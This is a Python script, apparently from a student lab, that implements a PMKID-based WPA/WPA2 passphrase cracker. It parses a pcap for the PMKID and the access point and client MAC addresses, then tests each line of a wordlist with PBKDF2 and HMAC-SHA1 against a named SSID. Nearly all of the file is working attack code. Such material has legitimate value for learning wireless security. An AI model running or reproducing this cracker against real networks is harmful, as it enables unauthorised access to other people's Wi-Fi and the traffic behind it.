#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__ = "Dany Oliveira da Costa & Stefan Simeunovic"
__version__ = "1.0"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def searchPMKID(pcap):
    """
    Recherche le PMKID dans la capture ainsi que la MAC de l'AP et du client nécessaire pour l'attaque avec PMKID.
    :param pcap: La capture pcap des trames
    :return: le PMKID, la MAC de l'AP et du client
    """

    for packet in pcap:
        if packet.haslayer(RadioTap) and packet.haslayer(EAPOL):    # authentifcation WPA
            if packet[EAPOL][Raw].original[1:3] == b'\x00\x8a':     # Premier message handshake, là ou se trouve le PMKID
                return packet.original[193:209], a2b_hex(packet.addr2.replace(':', '')), a2b_hex(packet.addr1.replace(':', ''))

                


WORDLIST_FILENAME = 'wordlist.txt_scaircrack.txt'


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 


# Important parameters to calculate PMKID - most of them can be obtained from the pcap file
ssid        = "Sunrise_2.4GHz_DD4B90"
binarySsid  = b'Sunrise_2.4GHz_DD4B90'
pmkid, apMac, clientMac = searchPMKID(wpa)


# Load wordlist
wordlist = open(WORDLIST_FILENAME, 'r')

for passPhrase in wordlist.read().splitlines():
    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(passPhrase)
    pmk = pbkdf2(hashlib.sha1, passPhrase, binarySsid, 4096, 32)


    # Calculate PMKID
    pmkBase = b'PMK Name' + apMac + clientMac
    pmkidToTest = hmac.new(pmk, pmkBase, hashlib.sha1).digest()

    # Comparaison avec PMKID de base trouvé dans la capture wireshark
    if pmkid == pmkidToTest[:16]:
        print("Passphrase found : ", passPhrase.decode())
        break


